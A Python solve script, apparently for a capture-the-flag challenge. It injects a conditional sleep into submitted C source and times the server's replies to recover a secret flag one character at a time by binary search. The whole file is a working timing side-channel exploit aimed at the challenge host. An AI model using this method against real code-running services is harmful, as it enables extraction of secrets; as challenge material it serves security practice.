import socket
import time

HOST = "wastingtime.chal.sunwaycybersecurityclub.org"
PORT = 1337
base = open("probe.c", "rb").read().rstrip(b"\n")
needle = b"usleep(b[i+5]*20000);"


def greater_than(offset, middle):
    replacement = f"if(b[i+5+{offset}]>{middle})usleep(2000000);".encode()
    source = base.replace(needle, replacement) + b"\n\n"
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        prompt = b""
        while not prompt.endswith(b"\n"):
            prompt += sock.recv(4096)
        start = time.monotonic()
        sock.sendall(source)
        response = b""
        while b"Verification failed\n" not in response:
            part = sock.recv(4096)
            if not part:
                raise RuntimeError(f"connection closed early: {response!r}")
            response += part
        elapsed = time.monotonic() - start
    return elapsed > 1.2, elapsed


flag = "sunway2"
for offset in range(len(flag), 80):
    low, high = 32, 126
    while low < high:
        middle = (low + high) // 2
        while True:
            try:
                answer, elapsed = greater_than(offset, middle)
                break
            except (OSError, RuntimeError) as error:
                print(f"retrying offset={offset:02d}: {error}", flush=True)
                time.sleep(1)
        print(f"offset={offset:02d} range={low:03d}-{high:03d} mid={middle:03d} t={elapsed:.3f}", flush=True)
        if answer:
            low = middle + 1
        else:
            high = middle
    flag += chr(low)
    print(f"FLAG SO FAR: {flag}", flush=True)
    if chr(low) == "}":
        break
print(f"FLAG: {flag}", flush=True)
